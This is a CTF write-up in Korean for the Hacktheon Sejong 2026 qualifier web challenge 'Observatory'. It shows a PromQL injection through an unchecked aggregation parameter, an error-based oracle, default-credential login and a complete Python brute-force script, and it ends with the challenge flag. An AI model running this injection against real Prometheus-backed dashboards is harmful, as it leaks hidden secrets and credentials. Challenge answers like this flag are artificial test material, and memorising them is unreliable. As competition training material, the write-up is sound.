---
title: "Hacktheon Sejong 2026 Quals Observatory Writeup"
published: 2026-04-28
description: "Hacktheon Sejong 2026 Quals Observatory 문제 풀이."
category: "CTF/Wargame"
tags: ["Hacktheon Sejong", "CTF", "Writeup", "Web"]
draft: false
listed: false
---

# Observatory

### Summary

대시보드의 Prometheus query API는 `metric`보다 `agg` 파라미터가 핵심이었다. 서버가 `agg(metric{namespace=...})` 형태로 PromQL을 조립하므로, `agg`에 expression을 넣어 숨겨진 `secret_config` label을 error oracle로 읽었다.

### Analysis

`/api/metrics`에는 `secret_config`, `internal_token`, `db_credentials` 같은 metric 이름이 보인다. 다만 `metric` 파라미터로 직접 읽으면 현재 namespace 기준으로 가공되어 원본 label/value가 나오지 않았다.

UI에서는 `agg`에 `sum`, `avg`, `max` 같은 값만 넣지만 API는 문자열을 그대로 받는다. 서버는 PromQL을 아래처럼 만든다.

```text
{agg}({metric}{namespace="현재 namespace"})
```

`agg`에 expression을 넣고 마지막을 `or sum`으로 끝내면 뒤에 붙는 `(...metric...)` 부분을 fallback 함수 호출로 소비시킬 수 있다.

출력은 숨겨져 있어서 error oracle을 만들었다. `secret_config{flag=~"^PREFIX.*"}`가 매칭되지 않으면 empty vector라 query가 성공한다. 매칭되면 일부러 many-to-one vector matching이 발생하도록 만들어 query error를 낸다.

oracle은 이렇게 잡았다.

```text
sum(secret_config{flag=~"^PREFIX.*"})
+ on()
sum by(__name__)({__name__=~"go_.*"})
or sum
```

응답 기준은 아래와 같다.

```text
Query failed -> prefix match
success      -> prefix miss
```

기본 계정 `admin:password`를 찾은 뒤 이 oracle로 flag label을 한 글자씩 brute force했다.

### Exploit

```python
import re
import requests

base = "http://43.201.43.169:3000"

s = requests.Session()
s.post(
    base + "/login",
    data={"username": "admin", "password": "password"},
    allow_redirects=False,
    timeout=5,
)


def prom_quote_regex(rx: str) -> str:
    return rx.replace("\\", "\\\\").replace('"', '\\"')


def oracle_regex(rx: str) -> bool:
    q = prom_quote_regex(rx)
    agg = (
        f'sum(secret_config{{flag=~"{q}"}}) '
        f'+ on() '
        f'sum by(__name__)({{__name__=~"go_.*"}}) '
        f'or sum'
    )

    r = s.post(
        base + "/api/query",
        json={"metric": "up", "agg": agg},
        timeout=5,
    )
    d = r.json()
    return d.get("status") == "error" and d.get("message") == "Query failed"


alphabet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_:-./@!$%&*+=,?[]()<>#"
prefix = ""

for _ in range(120):
    for ch in alphabet:
        candidate = prefix + ch
        if oracle_regex("^" + re.escape(candidate) + ".*"):
            prefix = candidate
            print(prefix)
            break
    else:
        break

    if prefix.endswith("}"):
        break

print("FLAG:", prefix)
```

### Flag

`hacktheon2026{pr0m3th3us_m3tr1c_s1d3ch4nn3l}`
